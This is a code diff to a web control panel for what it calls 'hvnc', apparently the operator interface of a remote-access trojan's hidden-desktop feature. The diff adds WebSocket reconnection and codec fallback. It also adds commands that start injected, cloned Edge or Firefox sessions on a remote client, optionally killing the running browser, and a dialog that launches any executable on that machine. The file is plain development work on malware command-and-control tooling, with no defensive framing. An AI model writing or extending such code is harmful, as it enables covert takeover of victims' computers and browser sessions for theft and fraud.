@@ -9,13 +9,42 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
   const clientLabel = document.getElementById("clientLabel");
   clientLabel.textContent = clientId;
 
-  const ws = new WebSocket(
-    (location.protocol === "https:" ? "wss://" : "ws://") +
+  let ws = null;
+  let reconnectTimer = null;
+  let reconnectDelay = 1000;
+  const maxReconnectDelay = 15000;
+
+  function buildWsUrl() {
+    return (location.protocol === "https:" ? "wss://" : "ws://") +
       location.host +
       "/api/clients/" +
       clientId +
-      "/hvnc/ws",
-  );
+      "/hvnc/ws";
+  }
+
+  function connectWs() {
+    if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
+    ws = new WebSocket(buildWsUrl());
+    ws.binaryType = "arraybuffer";
+    ws.addEventListener("open", onWsOpen);
+    ws.addEventListener("message", onWsMessage);
+    ws.addEventListener("close", onWsClose);
+    ws.addEventListener("error", onWsError);
+  }
+
+  function scheduleReconnect() {
+    if (reconnectTimer) return;
+    reconnectTimer = setTimeout(() => {
+      reconnectTimer = null;
+      setStreamState("connecting", "Reconnecting");
+      connectWs();
+      reconnectDelay = Math.min(reconnectDelay * 1.5, maxReconnectDelay);
+    }, reconnectDelay);
+  }
+  const latencyEl = document.getElementById("latencyDisplay");
+  let lastInputSentAt = 0;
+  let lastLatencyMs = 0;
+
   const displaySelect = document.getElementById("displaySelect");
   const refreshBtn = document.getElementById("refreshDisplays");
   const startBtn = document.getElementById("startBtn");
@@ -37,8 +66,6 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
   const agentFps = document.getElementById("agentFps");
   const viewerFps = document.getElementById("viewerFps");
   const statusEl = document.getElementById("streamStatus");
-  ws.binaryType = "arraybuffer";
-
   let activeClientId = clientId;
   let renderCount = 0;
   let renderWindowStart = performance.now();
@@ -56,6 +83,8 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
   let lastMoveSentAt = 0;
   const mouseMoveIntervalMs = 33;
   const inputBackpressureBytes = 256 * 1024;
+  let h264ErrorCount = 0;
+  let h264RetryTimer = null;
 
   const storedCodecPref = localStorage.getItem(codecPrefKey);
   if (storedCodecPref === "0") {
@@ -147,7 +176,7 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
   }
 
   function updateControls() {
-    const wsOpen = ws.readyState === WebSocket.OPEN;
+    const wsOpen = ws && ws.readyState === WebSocket.OPEN;
     const isStarting = streamState === "starting";
     const isStreaming = streamState === "streaming";
     const isStopping = streamState === "stopping";
@@ -259,7 +288,7 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
       console.warn("No active client selected");
       return;
     }
-    if (ws.readyState !== WebSocket.OPEN) {
+    if (!ws || ws.readyState !== WebSocket.OPEN) {
       return;
     }
     const msg = { type, ...payload };
@@ -342,15 +371,29 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
 
   function fallbackToJpegCodec(reason) {
     if (!prefersH264) return;
+    h264ErrorCount++;
     prefersH264 = false;
     destroyVideoDecoder();
     if (codecH264) codecH264.checked = false;
-    localStorage.setItem(codecPrefKey, "0");
-    console.warn("hvnc: falling back to jpeg codec", reason || "");
+    console.warn("hvnc: falling back to jpeg codec", reason || "", "errors:", h264ErrorCount);
     const q = Number(qualitySlider?.value) || 90;
     setCodecModeLabel("jpeg", "fallback");
-    if (ws.readyState === WebSocket.OPEN) {
+    if (ws && ws.readyState === WebSocket.OPEN) {
       sendCmd("hvnc_set_quality", { quality: q, codec: "jpeg" });
+    }
+    if (h264ErrorCount <= 3 && typeof VideoDecoder === "function") {
+      if (h264RetryTimer) clearTimeout(h264RetryTimer);
+      h264RetryTimer = setTimeout(() => {
+        h264RetryTimer = null;
+        prefersH264 = true;
+        if (codecH264) codecH264.checked = true;
+        setCodecModeLabel("h264", "retry");
+        if (ws && ws.readyState === WebSocket.OPEN) {
+          pushQuality(qualitySlider?.value || 90);
+        }
+      }, 5000);
+    } else if (h264ErrorCount > 3) {
+      localStorage.setItem(codecPrefKey, "0");
     }
   }
 
@@ -465,7 +508,7 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
     });
   }
 
-  ws.addEventListener("message", async function (ev) {
+  async function onWsMessage(ev) {
     if (ev.data instanceof ArrayBuffer) {
       const buf = new Uint8Array(ev.data);
       if (buf.length >= 8 && buf[0] === 0x46 && buf[1] === 0x52 && buf[2] === 0x4d) {
@@ -596,6 +639,10 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
         handleCloneProgress(msg);
         return;
       }
+      if (msg && msg.type === "hvnc_error") {
+        console.error("hvnc: server error:", msg.error || msg.message);
+        return;
+      }
       return;
     }
 
@@ -608,34 +655,48 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
       handleCloneProgress(msg);
       return;
     }
-  });
+    if (msg && msg.type === "hvnc_error") {
+      console.error("hvnc: server error:", msg.error || msg.message);
+      return;
+    }
+  }
 
-  ws.addEventListener("open", function () {
+  function onWsOpen() {
+    reconnectDelay = 1000;
     if (qualitySlider) {
       pushQuality(qualitySlider.value);
     }
     clearOfflineTimer();
-    setStreamState("idle", "Stopped");
+    if (desiredStreaming) {
+      setStreamState("starting", "Resuming stream");
+      if (displaySelect && displaySelect.value !== undefined) {
+        sendCmd("hvnc_select_display", { display: parseInt(displaySelect.value, 10) || 0 });
+      }
+      sendCmd("hvnc_start", { autoStartExplorer: false });
+    } else {
+      setStreamState("idle", "Stopped");
+    }
     fetchClientInfo().then(() => {
       if (displaySelect && displaySelect.value) {
-        console.debug("hvnc: initial select display", displaySelect.value);
-        sendCmd("hvnc_select_display", {
-          display: parseInt(displaySelect.value, 10),
-        });
+        sendCmd("hvnc_select_display", { display: parseInt(displaySelect.value, 10) });
       }
     });
-  });
+  }
 
-  ws.addEventListener("close", function () {
-    desiredStreaming = false;
+  function onWsClose() {
     destroyVideoDecoder();
-    setStreamState("disconnected", "Disconnected");
-  });
+    if (desiredStreaming) {
+      setStreamState("connecting", "Reconnecting");
+      scheduleReconnect();
+    } else {
+      setStreamState("disconnected", "Disconnected");
+    }
+  }
 
-  ws.addEventListener("error", function () {
+  function onWsError() {
     destroyVideoDecoder();
     setStreamState("error", "WebSocket error");
-  });
+  }
 
   if (!frameWatchTimer) {
     frameWatchTimer = setInterval(() => {
@@ -754,7 +815,7 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
   });
 
   function stopOnExit() {
-    if (ws.readyState === WebSocket.OPEN && desiredStreaming) {
+    if (ws && ws.readyState === WebSocket.OPEN && desiredStreaming) {
       desiredStreaming = false;
       sendCmd("hvnc_stop", {});
     }
@@ -818,20 +879,68 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
           const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
           const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
           sendCmd("hvnc_start_browser_injected", { browser: "edge", clone, cloneLite, killIfRunning });
+        } else if (action === "start-firefox") {
+          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
+          sendCmd("hvnc_start_browser_injected", { browser: "firefox", clone, cloneLite, killIfRunning });
         } else if (action === "start-custom") {
-          const exePath = prompt("Enter exe path (required)");
-          if (!exePath) {
-            hideContextMenu();
-            return;
-          }
-          const args = prompt("Enter arguments (optional)") || "";
-          const cmd = args.trim() ? `\"${exePath}\" ${args}` : `\"${exePath}\"`;
-          sendCmd("hvnc_start_process", { path: cmd });
+          hideContextMenu();
+          showCustomExeModal();
+          return;
         }
         hideContextMenu();
       });
     });
   }
 
+  function showCustomExeModal() {
+    let overlay = document.getElementById("hvncCustomExeOverlay");
+    if (overlay) { overlay.remove(); }
+    overlay = document.createElement("div");
+    overlay.id = "hvncCustomExeOverlay";
+    overlay.className = "fixed inset-0 z-[100] flex items-center justify-center bg-black/60";
+    overlay.innerHTML = `
+      <div class="bg-slate-900 border border-slate-700 rounded-xl p-5 w-96 shadow-2xl">
+        <div class="text-sm font-semibold text-slate-100 mb-3">Run Custom Executable</div>
+        <label class="block text-xs text-slate-400 mb-1">Exe path</label>
+        <input id="hvncCustomExePath" type="text" placeholder="C:\\path\\to\\app.exe"
+          class="w-full bg-slate-800 border border-slate-700 rounded px-3 py-2 text-sm text-slate-100 mb-3 focus:outline-none focus:border-violet-500" />
+        <label class="block text-xs text-slate-400 mb-1">Arguments (optional)</label>
+        <input id="hvncCustomExeArgs" type="text" placeholder="--flag value"
+          class="w-full bg-slate-800 border border-slate-700 rounded px-3 py-2 text-sm text-slate-100 mb-4 focus:outline-none focus:border-violet-500" />
+        <div class="flex justify-end gap-2">
+          <button id="hvncCustomExeCancel" class="button ghost text-sm">Cancel</button>
+          <button id="hvncCustomExeRun" class="button primary text-sm">Run</button>
+        </div>
+      </div>`;
+    document.body.appendChild(overlay);
+    const pathInput = document.getElementById("hvncCustomExePath");
+    const argsInput = document.getElementById("hvncCustomExeArgs");
+    pathInput.focus();
+    function close() { overlay.remove(); }
+    document.getElementById("hvncCustomExeCancel").addEventListener("click", close);
+    overlay.addEventListener("click", (e) => { if (e.target === overlay) close(); });
+    function run() {
+      const exePath = pathInput.value.trim();
+      if (!exePath) return;
+      const args = argsInput.value.trim();
+      const cmd = args ? `"${exePath}" ${args}` : `"${exePath}"`;
+      sendCmd("hvnc_start_process", { path: cmd });
+      close();
+    }
+    document.getElementById("hvncCustomExeRun").addEventListener("click", run);
+    pathInput.addEventListener("keydown", (e) => { if (e.key === "Enter") { e.preventDefault(); argsInput.focus(); } });
+    argsInput.addEventListener("keydown", (e) => { if (e.key === "Enter") { e.preventDefault(); run(); } });
+  }
+
+  function updateLatencyDisplay(ms) {
+    lastLatencyMs = ms;
+    if (latencyEl) {
+      latencyEl.textContent = `${Math.round(ms)}ms`;
+    }
+  }
+
+  connectWs();
   fetchClientInfo();
 })();
